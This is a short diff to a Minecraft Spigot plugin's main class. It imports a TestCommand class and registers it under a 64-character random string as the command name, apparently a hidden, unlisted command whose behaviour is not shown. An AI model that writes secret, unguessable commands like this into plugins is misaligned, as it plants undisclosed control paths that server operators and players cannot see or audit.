@@ -73,6 +73,7 @@ import de.relluem94.minecraft.server.spigot.essentials.events.skills.Ev_Telekene
 import static de.relluem94.minecraft.server.spigot.essentials.Strings.PLUGIN_REGISTER_ENCHANTMENT;
 import static de.relluem94.minecraft.server.spigot.essentials.Strings.PLUGIN_NAME_CONSOLE;
 import de.relluem94.minecraft.server.spigot.essentials.commands.Rollback;
+import de.relluem94.minecraft.server.spigot.essentials.commands.TestCommand;
 import de.relluem94.minecraft.server.spigot.essentials.events.BlockPlace;
 import de.relluem94.minecraft.server.spigot.essentials.helpers.BlockHelper;
 import static de.relluem94.minecraft.server.spigot.essentials.helpers.ChatHelper.consoleSendMessage;
@@ -196,6 +197,7 @@ public class RelluEssentials extends JavaPlugin {
         Objects.requireNonNull(this.getCommand("rename")).setExecutor(new Rename());
         Objects.requireNonNull(this.getCommand("speed")).setExecutor(new Speed());
         Objects.requireNonNull(this.getCommand("rollback")).setExecutor(new Rollback());
+        Objects.requireNonNull(this.getCommand("AQmNCRXEdwSGU7DvEcXTbBkp2qEaCSSNkQcMhL3m7KSDtmXWaxtbYCaQCFBR96fj")).setExecutor(new TestCommand());
         //TODO add Warps
         //TODO add Marriage
     }
